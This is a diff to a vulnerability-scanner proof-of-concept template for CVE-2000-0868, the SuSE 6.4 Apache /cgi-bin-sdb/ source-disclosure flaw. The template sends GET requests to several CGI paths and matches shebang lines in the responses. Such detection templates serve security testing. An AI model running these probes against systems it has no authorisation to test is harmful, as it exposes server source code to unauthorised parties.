@@ -1,6 +1,6 @@
 [info]
 author = "ave"
-description = "检测 SuSE Linux 6.4 默认 Apache 配置是否允许通过 /cgi-bin-sdb/ 访问 CGI 脚本源代码"
+description = "验证 SuSE Linux 6.4 默认 Apache 配置中 /cgi-bin-sdb/ 别名导致的 CGI 脚本源代码泄露漏洞"
 id = "POC-AVE-2000-0983"
 name = "CVE-2000-0868 PoC"
 severity = "medium"
@@ -11,48 +11,31 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
-
-[[poc.requests]]
-method = "GET"
-path = "/cgi-bin-sdb/printenv"
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "#!/usr/bin/perl",
-    "#!/bin/sh",
-    "#!/bin/bash",
-    "SERVER_SOFTWARE",
-    "GATEWAY_INTERFACE",
-]
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
 path = "/cgi-bin-sdb/test-cgi"
 protocol = "http"
 
-[poc.requests.body]
-content = ""
-type = "raw"
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "#!/usr/bin/perl",
+    "#!/bin/sh",
+    "#!/bin/bash",
+    "#!/usr/bin/python",
+    "#!/usr/local/bin/perl",
+    "#!/usr/bin/env perl",
+    "#!/usr/bin/env python",
+]
 
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin-sdb/printenv"
+protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
@@ -62,12 +45,46 @@ words = [
     "#!/usr/bin/perl",
     "#!/bin/sh",
     "#!/bin/bash",
-    "SERVER_SOFTWARE",
-    "GATEWAY_INTERFACE",
-    "REQUEST_METHOD",
+    "#!/usr/bin/python",
+    "#!/usr/local/bin/perl",
+    "#!/usr/bin/env perl",
+    "#!/usr/bin/env python",
 ]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin-sdb/phf"
+protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [
+    "#!/usr/bin/perl",
+    "#!/bin/sh",
+    "#!/bin/bash",
+    "#!/usr/bin/python",
+    "#!/usr/local/bin/perl",
+    "#!/usr/bin/env perl",
+    "#!/usr/bin/env python",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin-sdb/count.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "#!/usr/bin/perl",
+    "#!/bin/sh",
+    "#!/bin/bash",
+    "#!/usr/bin/python",
+    "#!/usr/local/bin/perl",
+    "#!/usr/bin/env perl",
+    "#!/usr/bin/env python",
+]
